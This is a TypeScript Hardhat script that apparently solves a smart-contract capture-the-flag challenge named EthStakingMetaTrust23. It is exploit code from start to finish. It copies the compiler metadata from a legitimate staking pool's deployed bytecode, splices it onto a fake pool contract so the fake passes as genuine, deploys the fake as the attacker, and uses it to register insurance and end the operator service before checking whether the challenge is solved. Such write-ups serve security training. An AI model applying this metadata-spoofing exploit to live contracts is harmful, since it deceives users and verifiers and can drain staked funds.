import chalk from "chalk";
import { ethers } from "hardhat";
import { EthStakingMetaTrust23__factory, EthStakingMetaTrust23, FakeEthStakingPool__factory } from "../../typechain";
import { log, initialize } from "../utils";

async function main() {
    let [EthStakingContract, attacker] = await initialize<EthStakingMetaTrust23>(EthStakingMetaTrust23__factory, undefined, undefined, "10");
    let insuranceAddress = await EthStakingContract.insurance();

    let originCode = await ethers.provider.getCode(await EthStakingContract.pool());
    let metadataLength = parseInt(originCode.slice(originCode.length-4, originCode.length), 16);
    let realMetadata = originCode.slice(originCode.length-metadataLength*2-4, originCode.length);

    let fakeStaking = await new FakeEthStakingPool__factory(attacker).deploy(await EthStakingContract.getAddress(), insuranceAddress);
    let tx0 = fakeStaking.deploymentTransaction();
    
    let fakeCode = tx0?.data.substring(0, tx0.data.length-32*2*2);
    let arg = tx0?.data?.substring(tx0.data.length-32*2*2, tx0.data.length);
    if (fakeCode) {
        let fakeMetadataLenth = parseInt(fakeCode?.slice(fakeCode.length-4, fakeCode.length), 16);
        fakeCode = fakeCode.slice(0, fakeCode.length-fakeMetadataLenth*2-4);
        let finalCode = fakeCode + realMetadata + arg;

        let tx = await attacker.sendTransaction({
            data: finalCode
        })
        let receipt = await tx.wait();
        if (receipt?.contractAddress) {
            let fakePool =  FakeEthStakingPool__factory.connect(receipt.contractAddress, attacker);
            tx = await fakePool.registerInsurance();
            await tx.wait();
            tx = await fakePool.endOperatorService();
            await tx.wait();
        }
    }

    log(`Is solved: ${chalk.yellow(await EthStakingContract.isSolved())}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});